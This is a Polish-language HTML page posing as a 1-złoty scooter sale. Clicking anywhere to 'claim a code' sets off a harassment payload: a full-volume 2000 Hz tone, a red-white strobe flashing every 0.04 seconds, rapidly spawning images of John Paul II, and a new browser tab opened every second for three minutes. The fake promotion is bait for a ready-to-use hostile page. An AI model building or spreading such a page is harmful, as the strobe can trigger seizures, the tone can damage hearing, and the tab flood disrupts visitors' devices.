<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Hulajnogi - WYPRZEDAŻ</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            overflow: hidden; background: #fff; font-family: sans-serif;
            display: flex; justify-content: center; align-items: center;
        }
        #ekran-start { text-align: center; cursor: pointer; }
        
        #warstwa-chaosu {
            display: none; position: fixed; top: 0; left: 0;
            width: 100%; height: 100%; z-index: 9999;
        }

        /* Szybkie błyski (stroboskop) */
        .miganie { animation: strobe 0.04s infinite; }
        @keyframes strobe {
            0% { background: #ff0000; }
            50% { background: #ffffff; }
            100% { background: #ff0000; }
        }

        /* Zdjęcia - tylko respienie, brak kręcenia */
        .respi-foto {
            position: absolute; 
            width: 250px; 
            z-index: 10000;
            pointer-events: none;
        }
    </style>
</head>
<body onclick="startuj()">

    <div id="ekran-start">
        <h1 style="font-size: 35px;">PROMOCJA: HULAJNOGA 1 ZŁ</h1>
        <div style="font-size: 100px;">🛴</div>
        <p>KLIKNIJ DOWOLNE MIEJSCE, ABY ODEBRAĆ KOD</p>
    </div>

    <div id="warstwa-chaosu"></div>

    <script>
        let uruchomione = false;
        const fotoUrl = "https://upload.wikimedia.org/wikipedia/commons/4/44/San_Giovanni_Paolo_II.jpg";
        
        // Lista stron do "spalenia" przeglądarki
        const strony = [
            "https://www.google.com",
            "https://www.wikipedia.org",
            "https://www.youtube.com",
            "https://www.allegro.pl",
            "https://www.facebook.com"
        ];

        function startuj() {
            if (uruchomione) return;
            uruchomione = true;

            // 1. STARY, WYSOKI PISK (2000Hz)
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            if (audioCtx.state === 'suspended') audioCtx.resume();
            
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'sine'; 
            osc.frequency.setValueAtTime(2000, audioCtx.currentTime); 
            gain.gain.setValueAtTime(1, audioCtx.currentTime); 
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();

            // 2. WIZUALIA (Chaos i Miganie)
            document.getElementById('ekran-start').style.display = 'none';
            const chaos = document.getElementById('warstwa-chaosu');
            chaos.style.display = 'block';
            chaos.classList.add('miganie');

            // 3. SZYBKIE RESPIENIE ZDJĘĆ (Co 40ms)
            const intervalFoto = setInterval(() => {
                const img = document.createElement('img');
                img.src = fotoUrl;
                img.className = 'respi-foto';
                img.style.left = Math.random() * (window.innerWidth - 250) + 'px';
                img.style.top = Math.random() * (window.innerHeight - 250) + 'px';
                chaos.appendChild(img);
                setTimeout(() => img.remove(), 1000);
            }, 40);

            // 4. "SPALANIE" - OTWIERANIE LOSOWEJ STRONY CO SEKUNDĘ
            const intervalStrony = setInterval(() => {
                const losowyAdres = strony[Math.floor(Math.random() * strony.length)];
                window.open(losowyAdres, '_blank');
            }, 1000); 

            // 5. WYŁĄCZENIE WSZYSTKIEGO PO 3 MINUTACH
            setTimeout(() => {
                clearInterval(intervalFoto);
                clearInterval(intervalStrony);
                osc.stop();
                location.reload(); 
            }, 180000);
        }
    </script>
</body>
</html>
